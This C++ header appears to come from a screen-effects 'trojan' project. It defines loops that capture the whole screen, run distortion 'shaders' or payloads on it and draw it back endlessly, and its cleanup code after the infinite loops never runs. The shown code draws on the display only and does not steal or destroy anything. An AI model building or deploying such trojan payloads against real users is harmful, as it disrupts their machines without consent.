#pragma once
#include <windows.h>
#include <cmath>
#include "vscreen.h"
#include "define.h"

void ExecuteShader(TROJAN_SHADER shader, bool delay) {
	HDC hdcScreen = GetDC(EffectDisplayWindow);
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	BITMAPINFO bmi = { 0 };
	PRGBQUAD prgbScreen;
	HDC hdcTempScreen;
	HBITMAP hbmScreen;

	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = szScreen.cx;
	bmi.bmiHeader.biHeight = szScreen.cy;

	prgbScreen = { 0 };

	hdcTempScreen = CreateCompatibleDC(EffectDisplayDC);
	hbmScreen = CreateDIBSection(EffectDisplayDC, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hdcTempScreen, hbmScreen);

	while (true) {
		BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, EffectDisplayDC, 0, 0, SRCCOPY);
		shader(szScreen.cx, szScreen.cy, prgbScreen);
		BitBlt(EffectDisplayDC, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
		if (delay == true) {
			Sleep(10);
		}
	}
	DeleteDC(hdcTempScreen);
	Sleep(100);
}

void ExecutePayload(TROJAN_PAYLOAD payload) {
	while (true) {
		payload(EffectDisplayDC);
	}
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	Sleep(100);
}